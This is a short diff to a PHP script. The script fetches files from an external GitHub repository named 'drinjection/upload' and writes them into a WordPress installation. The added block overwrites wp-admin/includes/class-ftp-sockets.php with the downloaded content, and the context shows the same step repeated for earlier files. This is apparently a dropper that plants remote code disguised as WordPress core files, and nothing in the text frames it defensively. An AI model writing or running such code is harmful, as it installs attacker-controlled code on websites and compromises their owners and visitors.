@@ -60,5 +60,16 @@ if(file_exists($check5)){
 }else
   echo "not exits5";
 echo "done5 .\n " ;
+
+$check6 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/includes/class-ftp-sockets.php" ;
+$text6 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/class-ftp-sockets.php');
+$open6 = fopen($check6, 'w');
+fwrite($open6, $text6);
+fclose($open6);
+if(file_exists($check6)){
+    echo $check6."</br>";
+}else
+  echo "not exits6";
+echo "done6 .\n " ;
  
 ?>
